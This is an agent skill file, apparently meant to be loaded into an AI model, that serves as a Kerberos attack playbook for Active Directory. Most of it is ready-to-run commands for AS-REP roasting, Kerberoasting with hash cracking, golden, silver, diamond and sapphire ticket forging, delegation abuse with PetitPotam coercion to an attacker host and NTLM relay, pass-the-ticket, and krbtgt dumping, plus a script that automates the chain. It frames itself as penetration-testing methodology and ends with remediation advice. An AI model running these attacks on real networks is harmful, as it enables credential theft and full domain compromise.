---
name: active-directory-kerberos-attacks
description: >-
  Kerberos attack playbook for Active Directory. Use when targeting AD authentication via AS-REP roasting, Kerberoasting, golden/silver/diamond tickets, delegation abuse, or pass-the-ticket attacks.
---

# SKILL: Kerberos Attack Playbook — Expert AD Attack Guide

> **AI LOAD INSTRUCTION**: Expert Kerberos attack techniques for AD environments. Covers AS-REP roasting, Kerberoasting, golden/silver/diamond/sapphire tickets, delegation attacks, pass-the-ticket, and overpass-the-hash. Base models miss ticket type distinctions, delegation chain nuances, and detection-evasion trade-offs.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based AD attacks often chained with Kerberos
- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for ADCS-based persistence (golden certificate)
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for NTLM relay attacks that complement Kerberos abuse
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after obtaining tickets for lateral movement

### Advanced Reference

Also load [KERBEROS_ATTACK_CHAINS.md](./KERBEROS_ATTACK_CHAINS.md) when you need:
- Multi-step attack chains combining Kerberos with ACL abuse, ADCS, and relay
- End-to-end scenarios from foothold to domain admin
- Chained delegation attack flows

---

## 1. KERBEROS AUTHENTICATION PRIMER

```
Client              KDC (DC)              Service
  │                   │                     │
  │── AS-REQ ────────→│                     │  (1) Request TGT with user creds
  │←─ AS-REP ─────────│                     │  (2) Receive TGT (encrypted with krbtgt hash)
  │                   │                     │
  │── TGS-REQ ───────→│                     │  (3) Present TGT, request service ticket
  │←─ TGS-REP ────────│                     │  (4) Receive TGS (encrypted with service hash)
  │                   │                     │
  │── AP-REQ ─────────────────────────────→│  (5) Present TGS to service
  │←─ AP-REP ──────────────────────────────│  (6) Mutual auth (optional)
```

---

## 2. AS-REP ROASTING

Users with "Do not require Kerberos preauthentication" can be queried for AS-REP without knowing their password.

### Enumerate Vulnerable Users

```bash
# Impacket — from Linux
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# Impacket — with domain creds (enumerate automatically)
GetNPUsers.py DOMAIN/user:password -dc-ip DC_IP -request

# Rubeus — from Windows (domain-joined)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# PowerView — enumerate users
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```

### Crack AS-REP Hash

```bash
# Hashcat mode 18200
hashcat -m 18200 asrep.txt rockyou.txt --rules-file best64.rule

# John
john asrep.txt --wordlist=rockyou.txt
```

---

## 3. KERBEROASTING

Any domain user can request TGS for accounts with SPNs. The TGS is encrypted with the service account's NTLM hash.

### Request Service Tickets

```bash
# Impacket
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile tgs.txt

# Rubeus (from Windows)
Rubeus.exe kerberoast /outfile:tgs.txt

# Rubeus — target specific SPN / high-value accounts
Rubeus.exe kerberoast /user:svc_sql /outfile:tgs_sql.txt

# PowerView + manual request
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db.domain.com"
```

### Crack TGS Hash

```bash
# Hashcat mode 13100 (RC4) or 19700 (AES)
hashcat -m 13100 tgs.txt rockyou.txt --rules-file best64.rule

# RC4 tickets crack much faster than AES256 — target RC4 if possible
# Rubeus: /tgtdeleg forces RC4 on some configs
Rubeus.exe kerberoast /tgtdeleg
```

---

## 4. TICKET FORGING — GOLDEN, SILVER, DIAMOND, SAPPHIRE

### Golden Ticket

Forge TGT using the `krbtgt` hash → impersonate any user, including non-existent ones.

```bash
# Impacket — forge golden ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM administrator

# Mimikatz
kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Rubeus
Rubeus.exe golden /rc4:KRBTGT_HASH /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /ptt
```

**Prerequisites**: krbtgt NTLM hash (from DCSync or NTDS.dit)
**Persistence**: Valid until krbtgt password is changed **twice**

### Silver Ticket

Forge TGS using the service account's hash → access specific service only, no KDC interaction.

```bash
# Impacket — forge silver ticket for CIFS (file share)
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM -spn cifs/target.domain.com administrator

# Mimikatz
kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /target:target.domain.com /service:cifs /rc4:SERVICE_HASH /ptt
```

| Target Service | SPN Format | Use Case |
|---|---|---|
| File shares | `cifs/host` | Access SMB shares |
| WinRM | `http/host` | Remote PowerShell |
| LDAP | `ldap/dc` | DCSync-like queries |
| MSSQL | `MSSQLSvc/host:1433` | Database access |
| Exchange | `http/mail.domain.com` | Mailbox access |

### Diamond Ticket

Modify a legitimately issued TGT → harder to detect than golden ticket.

```bash
# Rubeus — request real TGT then modify PAC
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:administrator /domain:DOMAIN.COM /dc:DC01.DOMAIN.COM /ticketuser:targetadmin /ticketuserid:500 /groups:512 /ptt
```

**Advantage**: The ticket's metadata (timestamps, enc type) matches a real TGT issuance.

### Sapphire Ticket

Uses S4U2Self to get a real PAC for the target user, then embeds it in a forged ticket.

```bash
# Rubeus
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /ticketuser:administrator /ticketuserid:500 /groups:512 /tgtdeleg /ptt
```

**Advantage**: PAC is a genuine copy from KDC, making detection extremely difficult.

---

## 5. DELEGATION ATTACKS

### Unconstrained Delegation

Hosts with unconstrained delegation store user TGTs in memory.

```bash
# Enumerate (PowerView)
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# Coerce admin authentication → capture TGT (Rubeus monitor mode)
Rubeus.exe monitor /interval:5 /nowrap

# Trigger via PrinterBug / PetitPotam → DC authenticates → TGT captured
SpoolSample.exe DC01.domain.com COMPROMISED_HOST.domain.com
```

### Constrained Delegation (S4U2Proxy)

```bash
# Enumerate
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto

# S4U2Self + S4U2Proxy → get TGS for allowed service as any user
getST.py -spn cifs/target.domain.com -impersonate administrator DOMAIN/svc_account:password -dc-ip DC_IP

# Rubeus
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.com /ptt
```

### Resource-Based Constrained Delegation (RBCD)

Requires write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target.

```bash
# 1. Create or control a computer account (MAQ > 0)
addcomputer.py -computer-name 'FAKE$' -computer-pass 'P@ss123' -dc-ip DC_IP DOMAIN/user:password

# 2. Set RBCD on target
rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip DC_IP -action write DOMAIN/user:password

# 3. S4U2Self + S4U2Proxy from controlled account
getST.py -spn cifs/TARGET.DOMAIN.COM -impersonate administrator DOMAIN/'FAKE$':'P@ss123' -dc-ip DC_IP

# 4. Use the ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass DOMAIN/administrator@TARGET.DOMAIN.COM
```

---

## 6. PASS-THE-TICKET & OVERPASS-THE-HASH

### Pass-the-Ticket

```bash
# Impacket — use .ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com

# Mimikatz — inject .kirbi ticket into session
kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:base64_ticket_blob
```

### Overpass-the-Hash (Pass-the-Key)

Use NTLM hash to request a Kerberos TGT → pure Kerberos authentication (avoids NTLM logging).

```bash
# Impacket
getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# Rubeus (from Windows)
Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt

# Mimikatz
sekurlsa::pth /user:administrator /domain:DOMAIN.COM /ntlm:NTLM_HASH /run:cmd.exe
```

---

## 7. KERBEROS DOUBLE HOP PROBLEM

When authenticating via Kerberos across two hops (A → B → C), B cannot forward A's credentials to C by default.

### Solutions

| Method | How | Risk |
|---|---|---|
| CredSSP | Sends actual credentials to B | Credential exposure |
| Unconstrained delegation on B | B stores A's TGT | Over-privileged |
| Constrained delegation | B allowed to delegate to C | Preferred — scoped |
| RBCD | C trusts B to delegate | Modern, flexible |
| Invoke-Command nested | `-Credential` param in nested session | Exposes password in script |

---

## 8. KERBEROS ATTACK DECISION TREE

```
AD environment — targeting Kerberos
│
├── Have domain user creds?
│   ├── Kerberoast → crack service account hashes (§3)
│   ├── Enumerate users without preauth → AS-REP roast (§2)
│   ├── Enumerate delegation → unconstrained/constrained/RBCD (§5)
│   └── Enumerate SPNs for high-value accounts
│
├── Have service account hash?
│   ├── Silver ticket for that service (§4)
│   └── If constrained delegation → S4U2Proxy chain (§5)
│
├── Have krbtgt hash?
│   ├── Golden ticket → any user, any service (§4)
│   ├── Diamond ticket → stealthier forging (§4)
│   └── Sapphire ticket → hardest to detect (§4)
│
├── Compromised host with unconstrained delegation?
│   ├── Monitor for incoming TGTs (Rubeus monitor)
│   ├── Coerce DC authentication (PrinterBug/PetitPotam)
│   └── Capture DC TGT → DCSync
│
├── Can write to target's msDS-AllowedToActOnBehalfOfOtherIdentity?
│   └── RBCD attack (§5) → create machine account + delegate
│
├── Have NTLM hash but need Kerberos auth?
│   └── Overpass-the-Hash → request TGT (§6)
│
└── Have .kirbi / .ccache ticket?
    └── Pass-the-Ticket → use directly (§6)
```

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the DC **issue the ticket or error** you targeted (AS-REP without pre-auth, TGS for an SPN)? | the protocol condition exists |
| 2 | Did you **crack it**, and in what time? | exploitability with a cost attached |
| 3 | Did the recovered material **authenticate** as the target principal? | the finding |
| 4 | For a forged ticket: did the **KDC or service accept it**? | forging works against this key material |
| 5 | For delegation: did the **impersonated identity get the service**? | the chain is live end to end |
| 6 | What did that identity **read or change** that the baseline could not? | impact, against a control |
| 7 | Is the principal **privileged, a service owner, or a DC**? | the severity driver |

**Authenticate as the principal, then read something.** A crack without a login, or a login without an
action, is an intermediate result. This playbook is deep on technique; that depth is only worth
reporting when it terminates at an authenticated action.

---

## 10. EXECUTION PRIMITIVES

This playbook carries the technique depth for the whole Kerberos attack surface. Everything below ends
at **an authenticated action proving the ticket works**, because a ticket file on disk proves nothing.

### 10.1 The baseline, and the artefacts that always matter

```bash
DC="dc01.corp.local"; DCIP="10.0.0.10"; DOM="corp.local"; U="lowpriv"; P='Password123!'
# the control identity and its reachable shares - the comparison point for every finding below
nxc smb "$DCIP" -u "$U" -p "$P" -d "$DOM" --shares
# the SID is needed by every forging technique; take it from the domain, never guess it
impacket-lookupsid "$DOM/$U:$P@$DC" 2>/dev/null | grep -oE 'S-1-5-21-[0-9-]+' | head -1 | tee /tmp/domain_sid
# and the clock, because Kerberos rejects anything outside five minutes
date -u; nxc smb "$DCIP" -u "$U" -p "$P" -d "$DOM" --time 2>/dev/null | head -1
```

**Record the baseline shares and the domain SID before anything.** Every later claim is a delta
against the baseline, and a wrong SID is the most common cause of a golden ticket that fails silently.

### 10.2 AS-REP roasting: enumerate, request, crack, authenticate

```bash
# 1) the vulnerable set - accounts with pre-auth disabled
impacket-GetNPUsers "$DOM/" -usersfile /tmp/users.txt -dc-ip "$DCIP" -no-pass -format hashcat \
  -outputfile /tmp/asrep.txt 2>/dev/null
grep -c '\$krb5asrep\$' /tmp/asrep.txt
# 2) crack, and record the TIME - it belongs in the report
time hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt -O --force
hashcat -m 18200 /tmp/asrep.txt --show | head -3
# 3) authenticate - this converts a configuration observation into a finding
nxc smb "$DCIP" -u 'VULN_USER' -p 'CRACKED_PASS' -d "$DOM" --shares
```

**Step 3 is mandatory.** Without it the report claims a vulnerability but demonstrates no access, which
is exactly the narrative failure this package is built to avoid.

### 10.3 Kerberoasting with the etype recorded

```bash
impacket-GetUserSPNs "$DOM/$U:$P" -dc-ip "$DCIP" -request -outputfile /tmp/tgs.txt
# the encryption type determines both the crack time and the fix - record it, do not assume RC4
grep -oE '\$krb5tgs\$(23|17|18)' /tmp/tgs.txt | sort | uniq -c
time hashcat -m 13100 /tmp/tgs.txt /usr/share/wordlists/rockyou.txt -O    # RC4-HMAC
time hashcat -m 19700 /tmp/tgs.txt /usr/share/wordlists/rockyou.txt -O    # AES256
# force RC4 where the client allows it, which is the higher-yield variant
impacket-GetUserSPNs "$DOM/$U:$P" -dc-ip "$DCIP" -request -outputfile /tmp/rc4.txt 2>/dev/null
# then prove the cracked account's reach
nxc smb "$DCIP" -u 'SPN_ACCOUNT' -p 'CRACKED_PASS' -d "$DOM" --shares
nxc mssql "$DCIP" -u 'SPN_ACCOUNT' -p 'CRACKED_PASS' -d "$DOM" -q 'SELECT @@VERSION' 2>/dev/null | head -3
```

**The etype belongs in every Kerberoasting sentence.** "Kerberoastable with AES256 only" and
"Kerberoastable with RC4" are different findings with different urgency, and conflating them is the
most common inflation in AD reports.

### 10.4 Golden, silver, diamond and sapphire tickets

```bash
KRBTGT="PASTE_KRBTGT_NT"; SID=$(cat /tmp/domain_sid); DOM="corp.local"
# golden: forge a TGT and prove the DC accepts it
impacket-ticketer -nthash "$KRBTGT" -domain-sid "$SID" -domain "$DOM" -user-id 500 Administrator -outdir /tmp
KRB5CCNAME=/tmp/Administrator.ccache impacket-secretsdump -k -no-pass "$DOM/Administrator@dc01.$DOM" \
  -just-dc-user krbtgt -dc-ip "$DCIP" 2>&1 | head -3
# silver: no DC interaction; prove it against the service directly
impacket-ticketer -nthash SERVICE_NT -domain-sid "$SID" -domain "$DOM" -spn cifs/files.$DOM Administrator -outdir /tmp
KRB5CCNAME=/tmp/Administrator.ccache impacket-smbclient -k -no-pass "files.$DOM" -c 'whoami; ls' 2>&1 | head -5
# diamond: request a real TGT then modify the PAC - preferred where PAC validation is enforced
Rubeus.exe diamond /krbkey:"PASTE_AES" /user:Administrator /tgtdeleg /nowrap
# sapphire: request a TGT as a user then alter the PAC to a privileged identity
Rubeus.exe sapphire /user:lowpriv /password:Password123! /krbkey:"PASTE_AES" /nowrap
```

**A forged ticket that `secretsdump` accepts is the closure of the loop.** Verify the SID from the
domain (10.1) rather than trusting a value from a write-up - a mismatched SID fails without a clear
error, and that failure is often misreported as "the DC patches golden tickets".

### 10.5 The delegation family, each proved by impersonation

```bash
# unconstrained: find the hosts, coerce, capture
impacket-findDelegation "$DOM/$U:$P" -dc-ip "$DCIP"
impacket-ntlmrelayx -t ldap://"$DCIP" -smb2support --delegate-access -of /tmp/relay.out &
python3 PetitPotam.py -d "$DOM" -u "$U" -p "$P" ATTACKER_IP "$DCIP"
sleep 15; ls -la /tmp/*.ccache 2>/dev/null; grep -ci 'ticket' /tmp/relay.out

# constrained (S4U2Proxy): the allowed-to list is the exploit surface
impacket-getST -spn cifs/target."$DOM" -impersonate Administrator "$DOM/svc_constrained:pass" -dc-ip "$DCIP"
KRB5CCNAME=Administrator@cifs_target."$DOM".ccache impacket-smbclient -k -no-pass "target.$DOM" -c 'whoami'

# RBCD: write the attribute, then prove the ticket it yields
impacket-addcomputer -computer-name EVIL\$ -computer-pass EvilPass123 -dc-ip "$DCIP" "$DOM/$U:$P"
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write -dc-ip "$DCIP" "$DOM/$U:$P"
impacket-getST -spn cifs/target."$DOM" -impersonate Administrator "$DOM/EVIL$:EvilPass123" -dc-ip "$DCIP"
```

**For every delegation variant, the attribute or coercion is the cause and the impersonated service
access is the effect.** This playbook documents four variants; the report needs the one you walked,
named with the attribute you set and the access you obtained.

### 10.6 Pass-the-ticket, overpass-the-hash, and the double hop

```bash
# pass-the-ticket: convert and use
impacket-ticketConverter ticket.kirbi ticket.ccache
KRB5CCNAME=$PWD/ticket.ccache impacket-smbclient -k -no-pass "TARGET.$DOM" -c 'whoami; shares' 2>&1 | head -6
# overpass-the-hash: NT hash to TGT to use
impacket-getTGT "$DOM/USER" -hashes ":NT_HASH" -dc-ip "$DCIP"
KRB5CCNAME=USER.ccache nxc smb "$DCIP" -k --use-kcache -d "$DOM" --shares 2>&1 | head -4
# the double hop: a second hop with a delegated context needs either unconstrained/constrained
# delegation, or an explicit CIFS credential; the failure is the classic 401-on-second-hop
KRB5CCNAME=$PWD/ticket.ccache impacket-psexec -k -no-pass "hop1.$DOM" \
  'nxc smb hop2.corp.local -u x -p x' 2>&1 | tail -5
```

**The double hop is diagnosed, not assumed.** A second hop failing with access denied is the expected
behaviour without delegation - record it as a limitation of the ticket's context, not as a broken
technique. The playbook's §7 covers the solutions; apply one and re-run before reporting success.

### 10.7 A harness that reports the stopping point honestly

```bash
python3 - <<'PY'
import subprocess,re,time
DC="10.0.0.10"; DOM="corp.local"; U="lowpriv"; P="Password123!"
def run(name,cmd,pat):
    t0=time.time()
    try: r=subprocess.run(cmd,capture_output=True,text=True,timeout=180); out=r.stdout+r.stderr
    except Exception as e: out=str(e)
    hit=bool(re.search(pat,out))
    print(f"{name:22} {time.time()-t0:6.1f}s evidence={hit} bytes={len(out)}")
    return hit
stages=[("asrep-request",["impacket-GetNPUsers",f"{DOM}/","-usersfile","/tmp/users.txt","-dc-ip",DC,"-no-pass"],r'\$krb5asrep\$'),
        ("asrep-crack",["hashcat","-m","18200","/tmp/asrep.txt","--show"],r':'),
        ("tgs-request",["impacket-GetUserSPNs",f"{DOM}/{U}:{P}","-dc-ip",DC,"-request"],r'\$krb5tgs\$'),
        ("tgs-crack",["hashcat","-m","13100","/tmp/tgs.txt","--show"],r':'),
        ("delegation-enum",["impacket-findDelegation",f"{DOM}/{U}:{P}","-dc-ip",DC],r'TRUSTED|Delegation')]
last=None
for n,c,p in stages:
    if run(n,c,p): last=n
print()
print(f"HIGHEST STAGE WITH EVIDENCE: {last}")
print("Report THAT stage. Do not describe the stages above it as achieved.")
PY
```

**Report the highest stage with evidence, and name the stage where the chain stopped.** This playbook
lists four ticket-forging variants and four delegation variants; a single finding almost never reaches
more than one of each, and claiming otherwise is fabrication.

---

## 11. EVIDENCE STANDARD

| Item | Why |
|---|---|
| **Domain, DC, and baseline credential level** | scoping the trust boundary |
| The **domain SID** used by any forging technique | proves the artefact was not a lucky guess |
| The **exact command and raw output** for each successful stage | reproducibility |
| The **ticket's encryption type** | it is the difference between a four-minute and a four-year crack |
| The **crack result and the wall-clock time** | exploitability with a cost |
| The **authenticated action** after the crack or forgery | the finding, stated as access |
| For forging: the **key's provenance** (which DCSync, which dump) | the chain is traceable |
| For delegation: the **attribute set or coercion used**, and the **impersonated identity** | cause and effect |
| The **baseline comparison** - the same action failing as `lowpriv` | shows escalation, not inherited access |
| **Detection artefacts** (4768, 4769, 4662, 4624 type 3) | the blue-team half |

Report the **ticket and the access**: "`GetUserSPNs` against `dc01.corp.local` as `lowpriv` returned a
TGS for `svc_sql` with etype 23; `hashcat -m 13100` recovered the password in 6 minutes; authenticating
as `svc_sql` and querying `MSSQLSvc/sql01.corp.local` returned `SQL Server 2019`, and the account holds
`sysadmin` on that instance; the instance hosts the billing database. `svc_sql` is not a Domain Admin,
so the impact is that database", never "Kerberoasting is possible".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A ticket requested but **not cracked** | the attack succeeded at the protocol layer and failed at the key; report it as such |
| A hash cracked but the account is **disabled or expired** | no access results; verify the principal is live |
| A forged ticket the **KDC rejects** | the key material or the SID is wrong; re-derive the SID |
| A **silver ticket against a service you already had access to** | no escalation |
| A delegation attribute you can write with **no service that accepts the ticket** | hardening only |
| **BloodHound's shortest path** with no walk executed | a hypothesis, not a finding |
| Access obtained with **credentials provided in the engagement scope** | not a discovered escalation |
| A finding reproduced against a **lab domain you built** | tests your own environment |
| Any ticket or hash reproduced **in full** in the report | a disclosure, not evidence |
| The double-hop failure presented as **a failed attack** | it is a known context limitation; say so |

**Name the stopping point.** This playbook is deliberately deep; the report must be deliberately
shallow - one walked chain, with its control, its crash point if it stopped, and its impact.

---

## 12. REMEDIATION REFERENCE

1. **Require pre-authentication on every account and alert on 4768 with the pre-auth flag clear** - AS-REP roasting is the absence of this single attribute.
2. **Move service accounts to gMSAs with 240-character managed passwords rotated by the domain** - the crack becomes infeasible and the rotation removes the standing value.
3. **Disable RC4-HMAC for the domain and require AES** - it lengthens the crack from minutes to a practical impossibility, and RC4's other weaknesses go with it.
4. **Rotate `krbtgt` twice, separated by more than the maximum ticket lifetime** - the only fix that invalidates issued golden tickets; a single rotation leaves the old key valid.
5. **Enable PAC validation and requestor validation on services** - it defeats silver tickets built on a service key, since the service validates the PAC with the KDC.
6. **Remove unconstrained delegation from every non-DC, and use the `Protected Users` group and "Account is sensitive and cannot be delegated"** - it removes the coercion-to-domain-control path.
7. **Audit constrained-delegation `msDS-AllowedToDelegateTo` lists and RBCD attributes for changes** - a write to `msDS-AllowedToActOnBehalfOfOtherIdentity` is the RBCD escalation and is highly auditable.
8. **Restrict the machine account quota (`ms-DS-MachineAccountQuota`) to 0** - it removes the attacker-controlled computer account RBCD requires.
9. **Enforce the `Protected Users` group for privileged accounts, and disable credential caching there** - it removes overpass-the-hash and pass-the-ticket for the accounts that matter.
10. **Enforce SMB signing, LDAP signing with channel binding, and disable NTLM** - the relays behind delegation and RBCD need an unsigned, unbound target.
11. **Monitor for ticket lifetimes and encryption anomalies** - a 10-year ticket lifetime (golden ticket default), or a TGS requested for an SPN by an account with no business relation to it, are both high-signal.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [kerberos-attacks](../kerberos-attacks/SKILL.md) - the flat command reference for the same attack families
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) - the ACL paths that grant the rights these techniques consume
- [ad-security](../ad-security/SKILL.md) - the surrounding methodology and the BloodHound workflow
- [hash-attack-techniques](../hash-attack-techniques/SKILL.md) - the cracking stage both roasting families end at
- [credential-access-atomic-tests](../credential-access-atomic-tests/SKILL.md) - the technique mapping for detection engineering
